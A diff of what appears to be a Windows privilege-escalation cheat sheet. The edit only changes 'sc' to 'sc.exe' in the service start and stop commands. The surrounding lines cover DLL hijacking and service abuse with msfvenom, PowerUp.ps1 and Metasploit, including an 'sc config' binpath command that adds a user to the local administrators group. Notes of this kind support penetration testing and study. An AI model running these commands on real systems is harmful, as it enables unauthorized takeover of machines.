@@ -72,8 +72,8 @@ msfvenom -p <payload> <payload params> -f dll -o <missing .dll name>.dll
 ```
 - Start/restart service
 ```powershell
-sc stop <service>
-sc start <service>
+sc.exe stop <service>
+sc.exe start <service>
 ```
 
 Using PowerUp.ps1
@@ -85,8 +85,8 @@ Write-HijackDll        # Create hijacking dll, will need to provide path
 ```
 - Start/restart service
 ```powershell
-sc stop <service>
-sc start <service>
+sc.exe stop <service>
+sc.exe start <service>
 ```
 
 ---
@@ -112,8 +112,8 @@ msfvenom -p <payload> <payload params> -f exe-service -o <file name>.exe
 
 Start/restart service
 ```powershell
-sc stop <service>
-sc start <service>
+sc.exe stop <service>
+sc.exe start <service>
 ```
 
 ---
@@ -176,8 +176,8 @@ Type | Description
 
 Start/restart service
 ```powershell
-sc stop <service>
-sc start <service>
+sc.exe stop <service>
+sc.exe start <service>
 ```
 
 ---
@@ -199,8 +199,8 @@ exploit/windows/local/service_permissions
 
 Start/restart service
 ```powershell
-sc stop <service>
-sc start <service>
+sc.exe stop <service>
+sc.exe start <service>
 ```
 
 ---
@@ -221,8 +221,8 @@ Get-ModifiableService                           # PowerUp.ps1
 
 Change binPath to exploit
 ```powershell
-sc config <service> binpath="net localgroup administrators user /add"
-sc config <service> binpath=<binary path>
+sc.exe config <service> binpath="net localgroup administrators user /add"
+sc.exe config <service> binpath=<binary path>
 ```
 ```powershell
 Invoke-ServiceAbuse -Name <service name> -Command <cmd>  # PowerUp.ps1
@@ -230,8 +230,8 @@ Invoke-ServiceAbuse -Name <service name> -Command <cmd>  # PowerUp.ps1
 
 Start/restart service
 ```powershell
-sc stop <service>
-sc start <service>
+sc.exe stop <service>
+sc.exe start <service>
 ```
 
 ---
